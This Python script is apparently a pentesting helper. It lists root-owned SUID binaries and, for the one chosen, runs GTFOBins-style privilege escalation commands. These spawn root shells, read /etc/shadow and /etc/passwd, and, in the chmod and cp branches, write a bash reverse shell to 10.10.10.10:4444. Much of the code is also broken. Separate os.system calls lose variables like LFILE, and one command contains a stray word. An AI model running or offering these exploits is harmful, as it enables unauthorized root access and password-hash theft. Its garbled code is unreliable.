from cmath import inf
import os
from re import S
import sys
import keyboard
import pyfiglet


ascii_banner = pyfiglet.figlet_format("Hello!! PRIVESC SUID")
print(ascii_banner )
print('')
print('')
print('')
lista=os.system('find / -user root -perm /4000 -ls 2>/dev/null')
print(lista)
quest=input('elige el SUID deseado:').lower()

#REMEMBER TO MODIFY THE "LFILE" ACCORDING TO WHAT YOU WANT TO EXPLOIT 

def main():
    if quest == 'nmap':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which nmap) .')
        os.system('TF=$(mktemp)')
        os.system('echo "os.execute("/bin/sh")" > $TF')
        os.system('./nmap --script=$TF')
    if quest == 'agetty':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which agetty) .')
        os.system('./agetty -o -p -l /bin/sh -a root tty')
    if quest == 'ar':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which ar) .')
        os.system('TF=$(mktemp -u)')
        os.system('LFILE=/etc/passwd') #MODIFY THIS
        os.system('./ar r "$TF" "$LFILE"')
        os.system('cat "$TF"')
    if quest == 'arj':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which arj) .')
        os.system('TF=$(mktemp -d)')
        os.system('LFILE=file_to_write') #MODIFY THIS 
        os.system('LDIR=where_to_write') #MODIFY THIS
        os.system('echo DATA >"$TF/$LFILE"')
        os.system('arj a "$TF/a" "$TF/$LFILE"')
        os.system('./arj e "$TF/a" $LDIR')
    if quest == 'arp':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which arp) .')
        os.system('LFILE=/etc/passwd') #MODOFY THIS
        os.system('./arp -v -f "$LFILE"')
    if quest == 'as':
       os.system('cd /tmp/')
       os.system('install -m =xs $(which as) .')
       os.system('LFILE=/etc/shadow') #MODOFY THIS
       os.system('./as @$LFILE')
    if quest == 'ascii-xfr':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which ascii-xfr) .')
        os.system('LFILE=/etc/shadow') #MODOFY THIS
        os.system('./ascii-xfr -ns "$LFILE"')
    if quest == 'ash':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which ash) .')
        os.system('./ash')
    if quest == 'aspell':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which aspell) .')
        os.system('LFILE=/etc/shadow') #MODIFY THIS
        os.system('./aspell -c "$LFILE"')
    if quest == 'atobm':
        os.system('cd /tmp/')
        os.system("ejecuta: install -m =xs $(which atobm) .")
        os.system('LFILE=file_to_read') #MODIFY THIS
        c4='{printf "%s", $2}'
        os.system(f"./atobm $LFILE 2>&1 | awk -F ''' '{c4}'")
    if quest == 'awk':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which awk) .')
        os.system('LFILE=/etc/shadow') #MODIFY THIS
        os.system('./awk "//" "$LFILE"')
    if quest == 'base32':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which base32) .')
        os.system('LFILE=/etc/shadow') #MODIFY THIS
        os.system('base32 "$LFILE" | base32 --decode')
    if quest == 'base64':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which base64) .')
        os.system('LFILE=/etc/shadow') #MODIFY THIS
        os.system('./base64 "$LFILE" | base64 --decode')
    if quest == 'bash':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which bash) .')
        os.system('./bash -p')
    if quest == 'bzip2':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which bzip2) .')
        os.system('LFILE=/etc/shadow') #MODIFY THIS
        os.system('./bzip2 -c $LFILE | bzip2 -d')
    if quest == 'capsh':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which capsh) .')
        os.system('./capsh --gid=0 --uid=0 --')
    if quest == 'cat':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which cat) .')
        os.system('LFILE=/etc/shadow') #MODIFY THIS
        os.system('./cat "$LFILE"')
    if quest == 'chmod':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which chmod) .')
        os.system('echo "/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" > exploit.sh')
        os.system('chmod +x exploit.sh')
        os.system('LFILE=exploit.sh')
        os.system('./chmod 6777 $LFILE')
        os.system('ls -la $LFILE')
    if quest == 'choom':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which choom) .')
        os.system('./choom -n 0 -- /bin/sh -p')
    if quest == 'chown':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which chown) .')
        os.system('LFILE=file_to_change') #MODIFY THIS
        os.system('./chown $(id -un):$(id -gn) $LFILE')
    if quest == 'chroot':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which chroot) .')
        os.system('./chroot / /bin/sh -p')
    if quest == 'cmp':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which cmp) .')
        os.system('LFILE=/etc/shadow') #MODIFY THIS
        os.system('./cmp $LFILE /dev/zero -b -l')
    if quest == 'column':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which column) .')
        os.system('LFILE=file_to_read')
        os.system('./column $LFILE')
    if quest == 'comm':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which comm) .')
        os.system('LFILE=file_to_read') #MODIFY THIS
        os.system('comm $LFILE /dev/null 2>/dev/null')
    if quest == 'cp':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which cp) .')
        os.system('echo "/bin/bash -i >& /dev/tcp/10.10.10.10/4444 0>&1" > exploit.sh')
        os.system('chmod +x exploit.sh')
        os.system('LFILE=exploit.sh')
        os.system('./cp sudo --attributes-only --preserve=all ./cp $LFILE') 
        os.system('ls -la $LFILE')
    if quest == 'nano':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which nano) .')
        os.system('./nano -s /bin/sh')
        os.system('/bin/sh')
        keyboard.press_and_release('ctrl+t')
    if quest == 'vim':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which vim) .')
        os.system('./vim -c ":py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")"')
    elif quest == 'cut':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which cut) .')
        os.system('LFILE=file_to_read') #MODIFY THIS
        os.system('./cut -d "" -f1 $LFILE')
    elif quest == 'dash':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which dash) .')
        os.system('./dash -p')
    elif quest == 'date':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which date) .')
        os.system('LFILE=file_to_read') #MODIFY THIS
        os.system('./date -f $LFILE')
    elif quest == 'diff':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which diff) .')
        os.system('LFILE=file_to_read') #MODIFY THIS
        os.system('./diff --line-format=%L /dev/null $LFILE')
    elif quest == 'docker':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which docker) .')
        os.system('./docker run -v /:/mnt --rm -it alpine chroot /mnt sh')
    elif quest == 'file':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which file) .')
        os.system('LFILE=file_to_read') #MODIFY THIS
        os.system('./file -f $LFILE')
    elif quest == 'find':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which find) .')
        os.system('./find . -exec /bin/sh -p \; -quit')
    elif quest == 'gawk':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which gawk) .')
        os.system('LFILE=file_to_read') #MODIFY THIS
        os.system('./gawk "//" $LFILE')
    elif quest == 'php':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which php) .')
        c1="'/bin/sh'"
        c2="['-p']"
        os.system('CMD="/bin/sh"')
        os.system(f'./php -r "pcntl_exec({c1}, {c2});"')
    elif quest == 'ip':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which ip) .')
        os.system('LFILE=file_to_read')
        os.system('./ip -force -batch "$LFILE"') #MODIFY THIS
    elif quest == 'less':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which less) .')
        os.system('./less file_to_read') #MODIFY THIS
    elif quest == 'logsave':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which logsave) .')
        os.system('./logsave /dev/null /bin/sh -i -p')
    elif quest == 'lua':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which lua) .')
        c5='("file_to_read", "rb")'
        c6='("*a")'
        os.system(f"lua -e 'local f=io.open{c5}; print(f:read{c6}); io.close(f);'")
    elif quest == 'more':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which more) .')
        os.system('./more file_to_read') #MODIFY THIS
    elif quest == 'openvpn':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which openvpn) .')
        c7='"sh -p"'
        os.system(f"./openvpn --dev null --script-security 2 --up '/bin/sh -p -c {c7}'")
    elif quest == 'perl':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which perl) .')
        c8='"/bin/sh"'
        os.system(f"./perl -e 'exec {c8};'")
    elif quest == 'python':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which python) .')
        c9='("/bin/sh", "sh", "-p")'
        os.system(f"./python -c 'import os; os.execl{c9}'")
    elif quest == 'rvim':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which rvim) .')
        c10='("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
        os.system("./rvim -c ':py import os; os.execl{c10}'")
    elif quest == 'time':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which time) .')
        os.system('./time /bin/sh -p')
    elif quest == 'timeout':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which timeout) .')
        os.system('./timeout 7d /bin/sh -p')
    elif quest == 'view':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which view) .')
        c11='("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
        os.system(f"./view -c ':py import os; os.execl{c11}'")
    elif quest == 'xargs':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which xargs) .')
        os.system('./xargs -a /dev/null sh -p')
    elif quest == 'zsh':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which zsh) .')
        os.system('./zsh')
    elif quest == 'sshpass':
        os.system('cd /tmp/')
        os.system('install -m =xs $(which sshpass) .')
        os.system('./sshpass /bin/sh -p')
    else:
        print('[!]SORRY, I HAVE NOT THAT SUID')

main()



        